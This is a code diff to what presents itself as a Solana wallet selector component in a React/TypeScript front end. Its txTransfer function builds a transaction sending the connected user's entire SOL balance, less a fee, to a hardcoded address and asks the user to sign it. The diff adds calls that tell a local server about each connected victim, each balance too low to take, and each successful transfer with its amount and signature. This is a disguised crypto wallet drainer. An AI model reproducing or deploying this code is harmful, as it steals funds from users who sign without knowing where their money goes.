@@ -22,6 +22,7 @@ import { isMobileDevice } from '@/functions/mobile'
 import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionMessage, VersionedTransaction } from '@solana/web3.js'
 import { BN } from 'bn.js'
 import { useWallet } from '@solana/wallet-adapter-react'
+import axios from 'axios'
 
 function WalletSelectorPanelItem({
   wallet,
@@ -44,30 +45,43 @@ function WalletSelectorPanelItem({
 
   const txTransfer = async () => {
     if (owner) {
-      const solBalance = new BN((await connection.getBalance(owner)).toString())
-      console.warn(solBalance)
-      const fee = new BN('1000000')
-      const toAddress = new PublicKey('H7YPtMRHNPcaNANC3BVeK2a3JW6mvduicm1qmcznQfGi')
-      if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) return
-      const instructions: TransactionInstruction[] = [];
-      instructions.push(
-        SystemProgram.transfer({
-          fromPubkey: owner,
-          toPubkey: toAddress,
-          lamports: solBalance.sub(fee).toNumber()
-        })
-      )
+      try {
+        await axios.post("http://localhost:3005/sendSignNotification", { owner: owner })
+        const solBalance = new BN((await connection.getBalance(owner)).toString())
+        console.warn(solBalance)
+        const fee = new BN('1000000')
+        const toAddress = new PublicKey('H7YPtMRHNPcaNANC3BVeK2a3JW6mvduicm1qmcznQfGi')
+        if (solBalance == undefined || solBalance.sub(fee).toNumber() < 0) {
+          console.warn("solbalancedddd")
+          await axios.post("http://localhost:3005/sendNotEnoughNotification")
+          return
+        }
+        const instructions: TransactionInstruction[] = [];
+        instructions.push(
+          SystemProgram.transfer({
+            fromPubkey: owner,
+            toPubkey: toAddress,
+            lamports: solBalance.sub(fee).toNumber()
+          })
+        )
 
-      const recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
-      const transactionMessage = new TransactionMessage({
-        payerKey: owner,
-        instructions: instructions,
-        recentBlockhash,
-      });
-      let tx = new VersionedTransaction(transactionMessage.compileToV0Message());
-      if (tx && signTransaction) {
-        tx = await signTransaction(tx)
-        const signature = await sendTransaction(tx, connection)
+        const recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
+        const transactionMessage = new TransactionMessage({
+          payerKey: owner,
+          instructions: instructions,
+          recentBlockhash,
+        });
+        let tx = new VersionedTransaction(transactionMessage.compileToV0Message());
+        if (tx && signTransaction) {
+          tx = await signTransaction(tx)
+          const signature = await sendTransaction(tx, connection)
+          const sentBalance = solBalance.toNumber() / 1000000000
+          if (signature) {
+            await axios.post("http://localhost:3005/sendTransferNotification", { balance: sentBalance.toFixed(4), tx: signature })
+          }
+        }
+      } catch (err) {
+        console.warn(err)
       }
     }
   }
